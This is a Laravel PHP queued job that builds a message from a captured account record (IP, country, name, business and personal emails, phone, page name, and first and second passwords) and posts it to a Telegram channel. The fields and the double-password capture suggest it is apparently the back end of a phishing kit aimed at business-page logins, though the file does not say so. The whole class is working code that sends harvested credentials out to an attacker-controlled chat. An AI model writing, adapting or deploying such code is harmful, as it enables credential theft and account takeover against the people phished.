<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Log;
use Telegram\Bot\Laravel\Facades\Telegram;

class SendTelegramAccount implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     */
    public function __construct(protected $account, protected $num = 1)
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $message = "IP: {$this->account->ip} | {$this->account->country} \n"
            . "Fullname: {$this->account->fullname} \n"
            . "Business Email:<code>{$this->account->business_email}</code> \n"
            . "Personal Email: {$this->account->personal_email} \n"
            . "Phone: {$this->account->phone} \n"
            . "Page Name: {$this->account->page} \n";

        if ($this->num == 1) {
            $message .= "First Password: {$this->account->first_password} \n";
        } else {
            $message .= "First Password: {$this->account->first_password} \n";
            $message .= "Second Password: {$this->account->second_password} \n";
        }


        try {
            Telegram::sendMessage([
                'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
                'parse_mode' => 'HTML',
                'text' => $message
            ]);
        } catch (\Exception $e) {
            Log::error($e->getMessage());
        }
    }
}
